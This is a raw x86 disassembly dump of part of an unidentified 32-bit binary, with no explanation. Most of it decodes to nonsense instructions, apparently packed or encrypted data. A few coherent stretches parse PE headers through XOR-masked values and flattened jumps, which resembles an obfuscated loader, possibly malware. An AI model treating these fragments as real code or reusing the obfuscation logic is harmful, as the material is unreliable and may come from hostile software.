  408cb6:	pop    ecx
  408cb7:	mov    eax,ds:0x79935ef9
  408cbc:	loop   0x408c6b
  408cbe:	ror    edi,1
  408cc0:	pop    ebp
  408cc1:	sub    BYTE PTR [ebp+0x51b0aec8],bh
  408cc7:	jne    0x408cf2
  408cc9:	jbe    0x408d0a
  408ccb:	or     eax,DWORD PTR [esi+0x5c]
  408cce:	nop
  408ccf:	mov    dl,0x10
  408cd1:	fsubr  QWORD PTR [edi+0x18]
  408cd4:	cmp    bl,dh
  408cd6:	sbb    al,BYTE PTR ss:[ebx+0x4f]
  408cda:	mov    es,WORD PTR [ebp-0x4dff1d0d]
  408ce0:	idiv   DWORD PTR [esi+edi*2+0x4b06ad20]
  408ce7:	arpl   WORD PTR [ecx+eax*2-0x35c2280e],di
  408cee:	jg     0x408d29
  408cf0:	lods   eax,DWORD PTR ds:[esi]
  408cf1:	rcl    DWORD PTR [ecx+0x9],cl
  408cf4:	or     dh,BYTE PTR [edi+0x72]
  408cf7:	js     0x408c7a
  408cf9:	fs out 0x5d,al
  408cfc:	popa   
  408cfd:	mov    eax,0xa09be9e8
  408d02:	pop    es
  408d03:	mov    ch,0x8e
  408d05:	mul    DWORD PTR [eax]
  408d07:	cmp    BYTE PTR [ebp+0x4978430f],ch
  408d0d:	sti    
  408d0e:	xor    bl,bh
  408d10:	scas   al,BYTE PTR es:[edi]
  408d11:	enter  0x3cdc,0xc3
  408d15:	inc    eax
  408d16:	pop    esp
  408d17:	mov    ecx,0xf0097e6d
  408d1c:	shl    DWORD PTR [ebp+0x51],0xfa
  408d20:	jmp    0x408d0c
  408d22:	or     ebx,DWORD PTR [edx+0x22]
  408d25:	fnsave [eax-0x5f]
  408d28:	sub    DWORD PTR [ecx-0xd],ebp
  408d2b:	or     ebp,DWORD PTR [esi-0x6a]
  408d2e:	mov    bl,0x2c
  408d30:	cs xor al,0xb1
  408d33:	loope  0x408d91
  408d35:	cmp    eax,0x3ecf6f27
  408d3a:	jae    0x408ccf
  408d3c:	sub    ah,cl
  408d3e:	mov    al,ds:0x7125bfdf
  408d43:	cdq    
  408d44:	leave  
  408d45:	jl     0x408d02
  408d47:	xlat   BYTE PTR ds:[ebx]
  408d48:	(bad)
  408d4b:	hlt    
  408d4c:	test   DWORD PTR [esi+0xd],edx
  408d4f:	cld    
  408d50:	cmp    al,0xd0
  408d52:	fisub  DWORD PTR [edx-0x3c7b9da2]
  408d58:	mov    ds:0xb5b00ba,al
  408d5d:	clc    
  408d5e:	das    
  408d5f:	push   ebp
  408d60:	test   BYTE PTR [eax+0x11],0x6b
  408d64:	cmp    cl,BYTE PTR [ebp+0x7a]
  408d67:	xor    al,0x2c
  408d69:	bound  eax,QWORD PTR [esi-0x4d]
  408d6c:	xlat   BYTE PTR ds:[ebx]
  408d6d:	out    dx,al
  408d6e:	mov    cl,0xc
  408d70:	nop
  408d71:	(bad)
  408d75:	add    eax,DWORD PTR [ecx-0x33]
  408d78:	scas   eax,DWORD PTR es:[edi]
  408d79:	rcl    esp,cl
  408d7b:	push   edi
  408d7c:	mov    dl,0x4f
  408d7e:	(bad)  
  408d7f:	jnp    0x408d57
  408d81:	bound  ebx,QWORD PTR [edi]
  408d83:	iret   
  408d84:	(bad)  
  408d85:	outs   dx,DWORD PTR ds:[esi]
  408d86:	adc    DWORD PTR [edi],esp
  408d88:	stos   DWORD PTR es:[edi],eax
  408d89:	pop    ds
  408d8a:	pop    esp
  408d8b:	pop    esi
  408d8c:	je     0x408d97
  408d8e:	cli    
  408d8f:	mov    bh,0x32
  408d91:	test   bh,ch
  408d93:	popf   
  408d94:	or     BYTE PTR [eax+eiz*4-0x25],dl
  408d98:	fiadd  DWORD PTR [esi-0x659d959d]
  408d9e:	dec    BYTE PTR [edx-0x9]
  408da1:	out    dx,eax
  408da2:	mov    BYTE PTR ds:[eax+eax*2+0x166e041a],cl
  408daa:	js     0x408d4a
  408dac:	fwait
  408dad:	mov    eax,0x9edb1ec1
  408db2:	push   ebp
  408db3:	into   
  408db4:	jp     0x408da1
  408db6:	jl     0x408e0f
  408db8:	fisttp QWORD PTR [edx+0x7bbfcbda]
  408dbe:	fcmovnb st,st(1)
  408dc0:	loopne 0x408dd2
  408dc2:	scas   al,BYTE PTR es:[edi]
  408dc3:	sar    DWORD PTR [eax+0x4bf9101b],0x13
  408dca:	jnp    0x408d66
  408dcc:	ret    
  408dcd:	hlt    
  408dce:	sub    al,0x3f
  408dd0:	clc    
  408dd1:	ror    ecx,1
  408dd3:	in     eax,dx
  408dd4:	cwde   
  408dd5:	sub    BYTE PTR [eax],0xed
  408dd8:	mov    ds:0x1a98b084,eax
  408ddd:	sub    al,0xd9
  408ddf:	sahf   
  408de0:	js     0x408e21
  408de2:	adc    BYTE PTR [edi-0x7],al
  408de5:	dec    edx
  408de6:	xchg   ebp,eax
  408de7:	les    esi,FWORD PTR [ebx]
  408de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dea:	in     al,dx
  408deb:	je     0x408dd5
  408ded:	pop    esp
  408dee:	test   BYTE PTR [eax-0x776de338],dl
  408df4:	jne    0x408d8f
  408df6:	loop   0x408dfb
  408df8:	(bad)  
  408df9:	nop
  408dfa:	jp     0x408e33
  408dfc:	jo     0x408e03
  408dfe:	mov    edx,0x76025825
  408e03:	stc    
  408e04:	add    ecx,DWORD PTR [ebx+eiz*8+0x72]
  408e08:	add    BYTE PTR [ecx],0xeb
  408e0b:	je     0x408db2
  408e0d:	cmp    edx,0xffffffc6
  408e10:	or     eax,DWORD PTR ds:0xeb5c1996
  408e16:	stc    
  408e17:	inc    esi
  408e18:	xchg   edx,eax
  408e19:	into   
  408e1a:	aam    0x96
  408e1c:	shr    DWORD PTR [ecx-0x4444f859],1
  408e22:	inc    eax
  408e23:	push   ecx
  408e24:	xchg   esi,eax
  408e25:	bound  esp,QWORD PTR [esi-0x75]
  408e28:	inc    ebp
  408e29:	cld    
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x62879a5b
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	sbb    esp,ecx
  408ec6:	pushf  
  408ec7:	stos   DWORD PTR es:[edi],eax
  408ec8:	sub    edx,ecx
  408eca:	stos   DWORD PTR es:[edi],eax
  408ecb:	cmp    al,0xb
  408ecd:	or     dh,0xb7
  408ed0:	in     al,0xe5
  408ed2:	scas   eax,DWORD PTR es:[edi]
  408ed3:	jle    0x408eb7
  408ed5:	in     eax,dx
  408ed6:	or     eax,DWORD PTR [edi]
  408ed8:	mov    dh,0x97
  408eda:	sub    edi,ebx
  408edc:	aaa    
  408edd:	add    al,0xd1
  408edf:	mov    ds:0x646bdd43,al
  408ee4:	test   al,0x90
  408ee6:	mov    eax,ds:0xe4968b28
  408eeb:	test   eax,0x2f329851
  408ef0:	sub    al,0x49
  408ef2:	rcl    BYTE PTR [esi-0x10],0xf5
  408ef6:	mov    cs,WORD PTR [eax-0x56]
  408ef9:	sub    dh,BYTE PTR [edx+0x11a8e8b0]
  408eff:	xchg   eax,ecx
  408f01:	call   0x341cb31b
  408f06:	add    BYTE PTR [esi-0x6afc5f6d],bh
  408f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f0d:	xchg   ebx,eax
  408f0e:	pop    ebp
  408f0f:	push   ds
  408f10:	dec    edx
  408f11:	sub    ah,BYTE PTR [edi+0x9]
  408f14:	clc    
  408f15:	(bad)  
  408f16:	and    BYTE PTR [edi+0x1c],al
  408f19:	sub    DWORD PTR [esi+0x13],ebp
  408f1c:	and    ebp,DWORD PTR [ebx+0x6f]
  408f1f:	mov    cl,0xe4
  408f21:	jmp    0x8bc6d2c2
  408f26:	mov    dh,0x95
  408f28:	lds    esp,FWORD PTR [eax+ecx*1]
  408f2b:	fisub  WORD PTR [ebx]
  408f2d:	inc    edi
  408f2e:	mov    dl,0xf1
  408f30:	add    dl,BYTE PTR [ebx+ecx*8-0x41]
  408f34:	cmp    DWORD PTR [ecx-0x358f59a3],ebx
  408f3a:	sub    DWORD PTR [ecx-0x2d000c39],0xfffffff3
  408f41:	adc    BYTE PTR [eax-0x5b],cl
  408f44:	and    eax,0xf0a5db65
  408f49:	(bad)  
  408f4a:	ror    ebp,0x6d
  408f4d:	and    ch,ch
  408f4f:	mov    al,ds:0xfd385c00
  408f54:	daa    
  408f55:	(bad)  
  408f56:	pop    ecx
  408f58:	mov    al,ds:0xbd8bff2b
  408f5d:	mov    esi,DWORD PTR [ecx]
  408f5f:	(bad)  
  408f60:	fimul  WORD PTR [edx-0x13]
  408f63:	dec    esp
  408f64:	dec    ecx
  408f65:	sub    BYTE PTR [ebx+0x5f9765e8],ch
  408f6b:	adc    eax,0xc0b56fef
  408f70:	lods   al,BYTE PTR ds:[esi]
  408f71:	or     edx,DWORD PTR [esi+0x7b7678ee]
  408f77:	jno    0x408f39
  408f79:	inc    esp
  408f7a:	into   
  408f7b:	adc    al,0x3c
  408f7d:	cwde   
  408f7e:	popf   
  408f7f:	and    BYTE PTR [esi+0x5c8c9ebc],0x38
  408f86:	xchg   esi,eax
  408f87:	test   DWORD PTR [edx+0x74],edi
  408f8a:	mov    ch,0x85
  408f8c:	mov    ds:0x2c40aada,eax
  408f91:	hlt    
  408f92:	xchg   edx,eax
  408f93:	xlat   BYTE PTR ds:[ebx]
  408f94:	jno    0x408fd4
  408f96:	add    ecx,DWORD PTR [esp+esi*8+0x30]
  408f9a:	xor    cl,BYTE PTR [ebx-0x2fbe7511]
  408fa0:	ret    
  408fa1:	call   0x5a72:0x2ab0fbf
  408fa8:	fidiv  DWORD PTR ds:[ebp+0x1e45d272]
  408faf:	adc    BYTE PTR [ebp+0x786aa2ad],ah
  408fb5:	clc    
  408fb6:	es out 0x70,eax
  408fb9:	jl     0x408fc7
  408fbb:	push   ebx
  408fbc:	inc    eax
  408fbd:	in     al,0xc3
  408fbf:	ror    dh,0x7b
  408fc2:	mov    BYTE PTR [edx],bl
  408fc4:	(bad)  
  408fc8:	cdq    
  408fc9:	add    esp,ebp
  408fcb:	add    cl,BYTE PTR [esi-0xaf8f9f4]
  408fd1:	cdq    
  408fd2:	and    ebp,esi
  408fd4:	outs   dx,DWORD PTR ds:[esi]
  408fd5:	inc    ebx
  408fd6:	aam    0x23
  408fd8:	cdq    
  408fd9:	xor    BYTE PTR [eax+0x55abcadb],ah
  408fdf:	stc    
  408fe0:	push   esp
  408fe1:	xlat   BYTE PTR ds:[ebx]
  408fe2:	inc    ebp
  408fe3:	or     eax,0xee57b3c0
  408fe8:	fcom   QWORD PTR [ebx-0xb599f51]
  408fee:	test   BYTE PTR ds:0x1983b2c3,bh
  408ff4:	dec    ecx
  408ff5:	mov    esp,0xc98956f5
  408ffa:	hlt    
  408ffb:	xchg   edi,eax
  408ffc:	lea    edx,[ebp+0x12]
  408fff:	push   esi
  409000:	(bad)  
  409001:	xor    DWORD PTR ds:0xeeff4b0f,ebx
  409007:	addr16 (bad) 
  409009:	push   cs
  40900a:	adc    al,0x3d
  40900c:	rep lods al,BYTE PTR ds:[esi]
  40900e:	lahf   
  40900f:	(bad)  
  409010:	(bad)  
  409011:	mov    ebx,0xab97b8d5
  409016:	ret    0x3d09
  409019:	das    
  40901a:	ror    BYTE PTR [ecx+0x164110a3],0xcc
  409021:	adc    BYTE PTR [esi+0x52493299],dh
  409027:	ins    BYTE PTR es:[edi],dx
  409028:	add    al,0x96
  40902a:	std    
  40902b:	and    al,0x4b
  40902d:	shl    al,0x1e
  409030:	fmul   QWORD PTR [edx-0xa]
  409033:	mov    al,0x92
  409035:	cmp    bh,bl
  409037:	push   0x576b9dd2
  40903c:	xchg   ebp,eax
  40903d:	and    BYTE PTR [ecx+0x13],dl
  409040:	shl    BYTE PTR [esi+0x69],0x28
  409044:	daa    
  409045:	push   ebx
  409046:	retf   
  409047:	cdq    
  409048:	fdivr  st(3),st
  40904a:	xchg   ecx,eax
  40904b:	mov    cl,0xdd
  40904d:	sub    al,0x9f
  40904f:	adc    eax,0x18ee9d2
  409054:	mov    ebx,0x405ff0ab
  409059:	or     eax,0x20efd177
  40905e:	idiv   DWORD PTR [ecx-0x4ed489be]
  409064:	push   0x425a118d
  409069:	stos   BYTE PTR es:[edi],al
  40906a:	dec    esi
  40906b:	jle    0x40906e
  40906d:	inc    eax
  40906e:	repz jl 0x40909b
  409071:	int    0xe8
  409073:	inc    ebp
  409074:	add    al,0x4b
  409076:	popf   
  409077:	lods   eax,DWORD PTR ds:[esi]
  409078:	dec    edx
  409079:	push   edi
  40907a:	add    BYTE PTR [ecx+0x7e054fb2],bh
  409080:	cmp    ah,BYTE PTR [edi]
  409082:	daa    
  409083:	sbb    DWORD PTR [ebp-0x71c85c71],ecx
  409089:	scas   al,BYTE PTR es:[edi]
  40908a:	icebp  
  40908b:	(bad)  
  40908c:	cli    
  40908d:	(bad)  
  40908e:	cmp    DWORD PTR [edx+0x124f93d],esp
  409094:	mov    ds:0xd248205a,eax
  409099:	mov    ebx,0x52b8fcfe
  40909e:	je     0x409092
  4090a0:	imul   DWORD PTR [esi]
  4090a2:	xchg   BYTE PTR [edi+0x6e3b4198],cl
  4090a8:	ins    BYTE PTR es:[edi],dx
  4090a9:	out    0x5a,al
  4090ab:	hlt    
  4090ac:	sub    al,0xc2
  4090ae:	sub    al,0x9f
  4090b0:	inc    edi
  4090b1:	and    BYTE PTR [ecx+0x1ac011e2],dh
  4090b7:	pop    edi
  4090b8:	or     ecx,DWORD PTR [eax]
  4090ba:	xor    BYTE PTR [ebx+0x27397937],dl
  4090c0:	loopne 0x40907c
  4090c2:	imul   ebx,ebp,0xd1340f52
  4090c8:	int3   
  4090c9:	push   ss
  4090ca:	or     bh,0x52
  4090cd:	push   ds
  4090ce:	adc    ecx,DWORD PTR [esi+0x7bfaf1fa]
  4090d4:	cli    
  4090d5:	inc    eax
  4090d6:	inc    edi
  4090d7:	adc    ah,bh
  4090d9:	dec    edi
  4090da:	cs out dx,al
  4090dc:	call   0xbb18:0x804c00e9
  4090e3:	jle    0x4090bc
  4090e5:	dec    ebp
  4090e6:	das    
  4090e7:	adc    cl,BYTE PTR [ebx]
  4090e9:	shr    DWORD PTR [ecx+0x59],0x47
  4090ed:	arpl   WORD PTR [ebx],si
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x22
  409163:	popf   
  409164:	and    ebp,DWORD PTR [esi]
  409166:	xor    bl,bh
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	mov    dl,0x67
  409170:	je     0x4090f9
  409172:	xchg   edx,eax
  409173:	add    DWORD PTR [edx+0x4e],ebp
  409176:	xor    DWORD PTR [ecx-0x69bd4fe3],ebp
  40917c:	add    eax,0xa88de78c
  409181:	sar    DWORD PTR cs:[ecx-0x47],cl
  409185:	outs   dx,DWORD PTR ds:[esi]
  409186:	jecxz  0x409141
  409188:	arpl   dx,di
  40918a:	cmp    esi,ecx
  40918c:	imul   BYTE PTR [ecx]
  40918e:	pop    edx
  40918f:	rol    BYTE PTR [ebx+0x33a25063],1
  409195:	ins    DWORD PTR es:[edi],dx
  409196:	pop    ebp
  409197:	pushf  
  409198:	inc    ecx
  409199:	xor    ebp,DWORD PTR [eax+edi*4+0x7e]
  40919d:	hlt    
  40919e:	sub    esi,edi
  4091a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091a1:	(bad)  
  4091a3:	outs   dx,DWORD PTR cs:[esi]
  4091a5:	jbe    0x4091d7
  4091a7:	dec    ebp
  4091a8:	mov    ch,0x2
  4091aa:	and    eax,0xbdd9beca
  4091af:	add    bh,BYTE PTR [ebp+0x328d1b95]
  4091b5:	sub    BYTE PTR [ecx],bl
  4091b7:	out    dx,al
  4091b8:	push   ss
  4091b9:	clc    
  4091ba:	push   ebx
  4091bb:	cmp    al,0x5f
  4091bd:	add    BYTE PTR [ebx-0x14],ch
  4091c0:	pop    eax
  4091c1:	or     DWORD PTR [eax],ebp
  4091c3:	jge    0x409241
  4091c5:	jno    0x4091c9
  4091c7:	test   DWORD PTR ds:[ebx+0x22c3f289],edx
  4091ce:	jb     0x409199
  4091d0:	imul   ecx,esi,0x5cfc53f3
  4091d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091d7:	repnz push ebx
  4091d9:	das    
  4091da:	lock test eax,0x90525632
  4091e0:	add    ecx,eax
  4091e2:	xchg   ch,ch
  4091e4:	scas   eax,DWORD PTR es:[edi]
  4091e5:	jnp    0x40924d
  4091e7:	in     al,dx
  4091e8:	mov    ebp,0x8328d3b2
  4091ed:	mov    ?,edx
  4091ef:	sub    ecx,DWORD PTR [esi-0x5bbf54f5]
  4091f5:	push   esi
  4091f6:	mov    bl,0x29
  4091f8:	fstp   TBYTE PTR [edi]
  4091fa:	cmp    BYTE PTR [eax+0x58],dl
  4091fd:	sbb    al,0xcd
  4091ff:	cmp    eax,0x76c7702c
  409204:	dec    eax
  409205:	ds jmp 0x6cb855cf
  40920b:	sbb    BYTE PTR [esp+ecx*4+0xf7e0d7c],0x15
  409213:	pop    esi
  409214:	dec    edi
  409215:	inc    ecx
  409216:	mov    gs,esi
  409218:	sbb    BYTE PTR [edx],bh
  40921a:	int    0x3b
  40921c:	mov    bl,0x86
  40921e:	push   0xffffffa8
  409220:	loop   0x40922c
  409222:	inc    edx
  409223:	(bad)  
  409224:	mov    al,ds:0x69a377e7
  409229:	lahf   
  40922a:	jmp    DWORD PTR [ecx+0x54620b8f]
  409230:	gs test BYTE PTR gs:[eax+0x65e07382],dl
  409238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409239:	ret    0xb24a
  40923c:	fcomp  QWORD PTR [eax]
  40923e:	push   ebx
  40923f:	aaa    
  409240:	mov    al,0x7d
  409242:	pop    ebp
  409243:	add    BYTE PTR [eax],0x10
  409246:	ds push edi
  409248:	jmp    DWORD PTR [ebx+0x5ec83945]
  40924e:	mov    dh,0xbc
  409250:	pop    ebp
  409251:	iret   
  409252:	ror    esp,1
  409254:	fist   WORD PTR [edi-0x23]
  409257:	adc    DWORD PTR [edi],esp
  409259:	(bad)  
  40925b:	sahf   
  40925c:	je     0x40926a
  40925e:	jle    0x409296
  409260:	dec    ebx
  409261:	mov    ds:0x98f25f9e,al
  409266:	jmp    0x7688:0xf64bdb02
  40926d:	mov    esi,0x2fa7e710
  409272:	jbe    0x409266
  409274:	jns    0x4091fa
  409276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409277:	push   cs
  409278:	arpl   WORD PTR [edi],cx
  40927a:	fsub   QWORD PTR [esp+edx*8-0xc3af14a]
  409281:	clc    
  409282:	enter  0xed43,0x20
  409286:	ins    DWORD PTR es:[edi],dx
  409287:	leave  
  409288:	sbb    BYTE PTR [ecx],dl
  40928a:	int3   
  40928b:	inc    edx
  40928c:	xchg   ecx,eax
  40928d:	cmp    al,0xf7
  40928f:	jne    0x40927e
  409291:	push   eax
  409292:	daa    
  409293:	out    0xdd,eax
  409295:	clc    
  409296:	sbb    eax,0xd1a2f533
  40929b:	mov    al,0x7c
  40929d:	or     DWORD PTR ds:0xdc493489,ecx
  4092a3:	das    
  4092a4:	pop    ss
  4092a5:	xchg   ebx,eax
  4092a6:	(bad)  
  4092a8:	stos   BYTE PTR es:[edi],al
  4092a9:	mov    ebx,0x5c0490e6
  4092ae:	xor    BYTE PTR [ebx+0x20],0xd
  4092b2:	sub    ecx,DWORD PTR ds:0x58c8daa3
  4092b8:	mov    eax,ds:0xab57dce
  4092bd:	dec    ebx
  4092be:	sub    ch,bh
  4092c0:	retf   
  4092c1:	pop    es
  4092c2:	scas   al,BYTE PTR es:[edi]
  4092c3:	faddp  st(3),st
  4092c5:	mov    dh,0x35
  4092c7:	clc    
  4092c8:	dec    esi
  4092c9:	push   0x89c73b23
  4092ce:	or     ebp,ebp
  4092d0:	in     al,dx
  4092d1:	retf   
  4092d2:	retf   0xfb3e
  4092d5:	push   edx
  4092d6:	ja     0x409292
  4092d8:	jbe    0x409336
  4092da:	adc    DWORD PTR [esi-0x5c],esi
  4092dd:	sti    
  4092de:	push   es
  4092df:	loop   0x4092c9
  4092e1:	adc    BYTE PTR [ebp-0x96b79d4],bl
  4092e7:	pop    ds
  4092e8:	sbb    ebx,DWORD PTR [ecx+0x33]
  4092eb:	push   ebp
  4092ec:	shr    BYTE PTR [esi-0x79],0xbd
  4092f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092f1:	xchg   esp,eax
  4092f2:	arpl   WORD PTR [ebx+0x6a1b53ef],bx
  4092f8:	or     al,0x94
  4092fa:	cmp    eax,0x2aeeaba
  4092ff:	sub    eax,0x57a8c487
  409304:	je     0x409372
  409306:	mov    dh,0xbb
  409308:	je     0x4092f3
  40930a:	popf   
  40930b:	lahf   
  40930c:	pop    ebp
  40930d:	fisub  WORD PTR [edx+0x72]
  409310:	pop    ecx
  409311:	jecxz  0x4092b2
  409313:	rcl    dh,0xbe
  409316:	xor    dl,dl
  409318:	adc    ecx,0x19c2e66b
  40931e:	sub    dl,BYTE PTR [ecx+0x3e]
  409321:	clc    
  409322:	std    
  409323:	stos   BYTE PTR es:[edi],al
  409324:	mov    al,0x83
  409326:	add    DWORD PTR [ebp+0x1a],ecx
  409329:	je     0x4093aa
  40932b:	scas   al,BYTE PTR es:[edi]
  40932c:	dec    ebp
  40932d:	fwait
  40932e:	push   ecx
  40932f:	(bad)  
  409330:	sti    
  409331:	jb     0x409316
  409333:	scas   al,BYTE PTR es:[edi]
  409334:	xacquire xchg BYTE PTR [eax],cl
  409337:	mov    dl,0x73
  409339:	add    bl,ah
  40933b:	(bad)  
  40933c:	push   cs
  40933d:	jno    0x4092d4
  40933f:	mov    eax,ds:0xb1f76a01
  409344:	inc    ebx
  409345:	out    0xd,al
  409347:	inc    edi
  409348:	or     BYTE PTR [edi],cl
  40934a:	shl    DWORD PTR [ecx+eax*4+0x5a64e908],1
  409351:	outs   dx,BYTE PTR ds:[esi]
  409352:	popa   
  409353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409354:	adc    eax,0xf83571d4
  409359:	fwait
  40935a:	mov    WORD PTR [esi+0xe],fs
  40935d:	add    esp,esi
  40935f:	jo     0x40932e
  409361:	in     eax,dx
  409362:	aas    
  409363:	push   edi
  409364:	jecxz  0x409309
  409366:	xchg   BYTE PTR [edx-0x2cdb43d5],dl
  40936c:	pop    ss
  40936d:	jp     0x409304
  40936f:	inc    edx
  409370:	pop    es
  409371:	(bad)  
  409372:	cmc    
  409373:	test   DWORD PTR [edi],0xfb0eaea9
  409379:	dec    ecx
  40937a:	gs dec ebp
  40937c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40937d:	dec    eax
  40937e:	fwait
  40937f:	mov    esp,0x3f35a08e
  409384:	push   esi
  409385:	xchg   ebx,eax
  409386:	jb     0x409326
  409388:	call   0x575d:0x1010b91b
  40938f:	std    
  409390:	or     DWORD PTR [ecx],0xec1a00c8
  409396:	sbb    ch,BYTE PTR [ebp+0x458b0889]
  40939c:	or     al,0x8b
  40939e:	inc    ebp
  40939f:	or     bh,bh
  4093a1:	jne    0x40939b
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	push   esp
  4093b5:	out    dx,al
  4093b6:	and    esp,esi
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	pop    eax
  4093c1:	xor    DWORD PTR ds:0xd7d21ab7,ebp
  4093c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093c8:	sahf   
  4093c9:	fld    DWORD PTR [edi-0x31e857ac]
  4093cf:	and    dh,0xef
  4093d2:	pop    es
  4093d3:	add    BYTE PTR [ebx+0x6e5597aa],ch
  4093d9:	call   0x5a2ae5ba
  4093de:	dec    eax
  4093df:	out    dx,al
  4093e0:	jmp    0x8bc855c5
  4093e5:	stos   BYTE PTR es:[edi],al
  4093e6:	test   BYTE PTR [ecx+0x5f],dl
  4093e9:	mov    edx,0x83631852
  4093ee:	lods   al,BYTE PTR ds:[esi]
  4093ef:	es jnp 0x40945d
  4093f2:	dec    eax
  4093f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093f4:	mov    esp,0x839ce002
  4093f9:	mov    ecx,0xd9b7d61b
  4093fe:	fmul   QWORD PTR [ebx]
  409400:	sar    dh,cl
  409402:	je     0x4093ad
  409404:	shr    DWORD PTR [edx+0x7b959655],cl
  40940a:	push   esp
  40940b:	ins    DWORD PTR es:[edi],dx
  40940c:	inc    eax
  40940d:	xchg   BYTE PTR [ecx],bl
  40940f:	stc    
  409410:	mov    cl,0x1b
  409412:	int3   
  409413:	dec    edx
  409414:	mov    ds:0x87fd6ae7,eax
  409419:	repz and al,0xed
  40941c:	and    ebp,edi
  40941e:	std    
  40941f:	xbegin 0xb609080d
  409425:	loop   0x4093d8
  409427:	jne    0x40945c
  409429:	popa   
  40942a:	(bad)  
  40942b:	in     eax,0xb2
  40942d:	sub    DWORD PTR [ebx],0xffffffc3
  409430:	push   ebx
  409431:	das    
  409432:	mov    WORD PTR [ebx+0x70da8c44],fs
  409438:	jl     0x4094b1
  40943a:	scas   eax,DWORD PTR es:[edi]
  40943b:	pusha  
  40943c:	cli    
  40943d:	cmp    eax,0x8ab49f5c
  409442:	sbb    al,0xd4
  409444:	mov    dh,BYTE PTR ds:0xd0cadd99
  40944a:	mov    bh,0x55
  40944c:	adc    BYTE PTR [ebp+0x62eeebdf],0xd9
  409453:	cld    
  409454:	mov    al,ds:0x6d752725
  409459:	cmp    eax,0x7786f499
  40945e:	and    al,0x7e
  409460:	pop    ss
  409461:	xchg   edx,eax
  409462:	fistp  QWORD PTR [esi-0x523f6889]
  409468:	mov    cl,BYTE PTR [ecx]
  40946a:	pop    esp
  40946b:	scas   al,BYTE PTR es:[edi]
